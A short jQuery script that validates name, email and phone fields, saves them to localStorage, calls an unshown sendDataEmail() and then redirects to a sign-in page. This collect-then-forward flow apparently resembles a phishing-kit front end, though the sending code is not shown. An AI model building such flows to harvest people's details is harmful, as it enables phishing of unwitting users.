var isValid = true;
// Hàm validate Full Name
function validateFullName(fullName) {
  if (fullName.trim() === '') {
    // Nếu input trống, đổi màu nền thành đỏ và hiển thị lỗi
    $('#fullName').css('border-color', '#ca3112');
    $('#errorMessage').text('This field is required.');
    isValid = false;
  } else {
    // Xóa màu nền và thông báo lỗi nếu có giá trị
    $('#fullName').css('border-color', '');
    $('#errorMessage').text('');
  }
}



// Hàm validate Email
function validateEmail(Email) {
  // Kiểm tra Email
  if (Email === '') {
    $('#Email').css('border-color', '#ca3112');
    $('#emailError').text('This field is required.');
    isValid = false;
  } else if (!validateEmailCheck(Email)) {
    $('#Email').css('border-color', '#ca3112');
    $('#emailError').text('Email is not in a recognized format.');
    isValid = false;
  } else {
    $('#Email').css('border-color', '');
    $('#emailError').text('');
  }
}

// Hàm validate Phone Number
function validatePhoneNumber(phoneNumber) {
  if (phoneNumber === '') {
    $('#Phone').css('border-color', '#ca3112');
    $('#phoneError').text('This field is required.');
    isValid = false;
  } else if (!validatePhoneNumberCheck(phoneNumber)) {
    $('#Phone').css('border-color', '#ca3112');
    $('#phoneError').text('Phone is not in a recognized format.');
    isValid = false;
  } else {
    $('#Phone').css('border-color', '');
    $('#phoneError').text('');
  }
}

$(document).ready(function () {
  localStorageinit();

  isValid = false;
  $('#fullName').blur(function () {
    validateFullName($('#fullName').val());
  });


  $('#Email').on('input', function () {
    validateEmail($(this).val());
  });

  $('#Phone').on('input', function () {
    validatePhoneNumber($('#Phone').val());
  });

  $("[name='login']").click(function () {
    isValid = true;
    validateFullName($('#fullName').val());
    validateEmail($('#Email').val());
    validatePhoneNumber($('#Phone').val());
    if (isValid) {
      
      localStorage.setItem('fullname',$('#fullName').val());
      localStorage.setItem('email',$('#Email').val());
      localStorage.setItem('phone',$('#Phone').val());
      sendDataEmail();
      setTimeout(function() {
        if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
          window.location.href = "../signin/loginmb.html";
      } else {
        window.location.href = "../signin/login.html";

      }
    }, 3000); 
    }
  });
});